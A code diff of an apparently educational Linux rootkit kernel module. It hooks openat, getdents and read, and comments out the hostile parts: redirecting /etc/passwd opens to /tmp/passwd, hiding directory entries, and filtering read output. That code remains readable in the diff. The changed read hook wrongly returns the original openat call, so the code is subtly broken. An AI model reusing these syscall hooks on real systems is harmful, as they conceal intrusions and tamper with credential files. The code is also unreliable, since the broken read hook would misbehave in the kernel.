@@ -47,15 +47,18 @@ asmlinkage ssize_t (*original_read)(struct pt_regs *);
 // DI, SI, DX
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
     // Implement the sneaky part here
+    /*
     if (strnstr((char *)regs->si, "/etc/passwd", strlen("/etc/passwd")) != NULL) {
         copy_to_user((void *)regs->si, "/tmp/passwd", strlen("/tmp/passwd"));
     }
+     */
     return (*original_openat)(regs);
 }
 
 // int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 // DI, SI, DX
 asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
+    /*
     struct linux_dirent *d;
     int nread = original_getdents((unsigned int)regs->di, (struct linux_dirent *)regs->si, (unsigned int)regs->dx);
 
@@ -76,11 +79,14 @@ asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
         bpos += d->d_reclen;
     }
     return nread;
+    */
+    return (*original_getdents)(regs);
 }
 
 // ssize_t read(int fd, void *buf, size_t count);
 // DI, SI, DX
 asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
+    /*
     ssize_t nread = original_read(regs->di, regs->si, regs->dx);
     if (nread == -1) {
         return -1;
@@ -97,6 +103,8 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
         }
     }
     return nread;
+     */
+    return (*original_openat)(regs);
 }
 
 // The code that gets executed when the module is loaded
